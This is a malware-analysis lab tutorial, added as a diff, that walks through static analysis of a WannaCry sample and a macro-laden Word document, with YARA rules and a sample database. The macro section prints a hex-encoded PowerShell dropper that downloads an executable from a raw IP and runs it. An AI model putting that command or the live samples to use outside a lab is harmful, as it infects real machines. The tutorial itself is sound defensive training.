@@ -1,0 +1,411 @@
+############################
+# Download the Analysis VM #
+############################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+ 
+ 
+ 
+- Log in to your Ubuntu system with the username 'infosecaddicts' and the password 'infosecaddicts'.
+ 
+ 
+###################################
+# Setting up your virtual machine #
+################################### 
+
+Here is where we will setup all of the required dependencies for the tools we plan to install
+---------------------------Type This-----------------------------------
+sudo apt update
+sudo apt-get install -y python3-pip python3-dev unzip python3-setuptools ipython3 build-essential python-pefile python2.7 python-pip python-setuptools mysql-server build-dep python-mysqldb python-mysqldb
+
+
+sudo pip install -U olefile
+
+
+git clone https://github.com/Te-k/pe.git
+cd pe
+sudo python3 setup.py install
+pip3 install .
+cd ..
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+     infected
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+ 
+ 
+The fastest thing you can do is perform static analysis.
+ 
+ 
+ 
+###################
+# Static Analysis #
+###################
+ 
+- After logging please open a terminal window and type the following commands:
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~
+
+mkdir static_analysis
+
+cd static_analysis
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+mv wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+----------------------------------------------------------------------
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+pe info wannacry.exe
+pe check wannacry.exe
+pe dump --section text wannacry.exe
+pe dump --section data wannacry.exe
+pe dump --section rsrc wannacry.exe
+pe dump --section reloc wannacry.exe
+strings rdata | less
+strings rsrc | less
+strings text | less
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+
+
+
+
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+ 
+---------------------------Type This-----------------------------------
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+
+ 
+
+
+
+
+ 
+ 
+ 
+
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+vi am.py
+ 
+python2.7 am.py wannacry.exe
+----------------------------------------------------------------------
+ 
+  
+ 
+##############
+# Yara Ninja #
+##############
+
+Reference:
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+----------------------------------------------------------------------------
+rule wannacry_1 : ransom
+{
+    meta:
+        author = "Joshua Cannell"
+        description = "WannaCry Ransomware strings"
+        weight = 100
+        date = "2017-05-12"
+ 
+    strings:
+        $s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+        $s2 = "Wanna Decryptor" wide ascii nocase
+        $s3 = ".wcry" wide ascii nocase
+        $s4 = "WANNACRY" wide ascii nocase
+        $s5 = "WANACRY!" wide ascii nocase
+        $s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+ 
+    condition:
+        any of them
+}
+ 
+----------------------------------------------------------------------------
+rule wannacry_2{
+    meta:
+        author = "Harold Ogden"
+        description = "WannaCry Ransomware Strings"
+        date = "2017-05-12"
+        weight = 100
+ 
+    strings:
+        $string1 = "msg/m_bulgarian.wnry"
+        $string2 = "msg/m_chinese (simplified).wnry"
+        $string3 = "msg/m_chinese (traditional).wnry"
+        $string4 = "msg/m_croatian.wnry"
+        $string5 = "msg/m_czech.wnry"
+        $string6 = "msg/m_danish.wnry"
+        $string7 = "msg/m_dutch.wnry"
+        $string8 = "msg/m_english.wnry"
+        $string9 = "msg/m_filipino.wnry"
+        $string10 = "msg/m_finnish.wnry"
+        $string11 = "msg/m_french.wnry"
+        $string12 = "msg/m_german.wnry"
+        $string13 = "msg/m_greek.wnry"
+        $string14 = "msg/m_indonesian.wnry"
+        $string15 = "msg/m_italian.wnry"
+        $string16 = "msg/m_japanese.wnry"
+        $string17 = "msg/m_korean.wnry"
+        $string18 = "msg/m_latvian.wnry"
+        $string19 = "msg/m_norwegian.wnry"
+        $string20 = "msg/m_polish.wnry"
+        $string21 = "msg/m_portuguese.wnry"
+        $string22 = "msg/m_romanian.wnry"
+        $string23 = "msg/m_russian.wnry"
+        $string24 = "msg/m_slovak.wnry"
+        $string25 = "msg/m_spanish.wnry"
+        $string26 = "msg/m_swedish.wnry"
+        $string27 = "msg/m_turkish.wnry"
+        $string28 = "msg/m_vietnamese.wnry"
+ 
+ 
+    condition:
+        any of ($string*)
+}
+----------------------------------------------------------------------------
+ 
+
+
+
+
+
+
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+#####################################################
+---------------------------Type This-----------------------------------
+mkdir ~/oledump
+ 
+cd ~/oledump
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+-----------------------------------------------------------------------
+
+
+
+###############################
+# Creating a Malware Database #
+###############################
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Logging in
+Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+mysql -u root -p                    (set a password of 'malware')
+ 
+- Then create one database by running following command:
+ 
+create database malware;
+ 
+exit;
+ 
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+ 
+vi mal_to_db.py                     (fill in database connection information)
+ 
+python mal_to_db.py -i
+ 
+------- check it to see if the files table was created ------
+ 
+mysql -u root -p
+    malware
+ 
+show databases;
+ 
+use malware;
+ 
+show tables;
+ 
+describe files;
+ 
+exit;
+ 
+---------------------------------
+ 
+ 
+- Now add the malicious file to the DB
+---------------------------Type This-----------------------------------
+python mal_to_db.py -f wannacry.exe -u
+ 
+ 
+ 
+- Now check to see if it is in the DB
+---------------------------Type This-----------------------------------
+mysql -u root -p
+    malware
+ 
+mysql> use malware;
+ 
+select id,md5,sha1,sha256,time FROM files;
+ 
+mysql> quit;
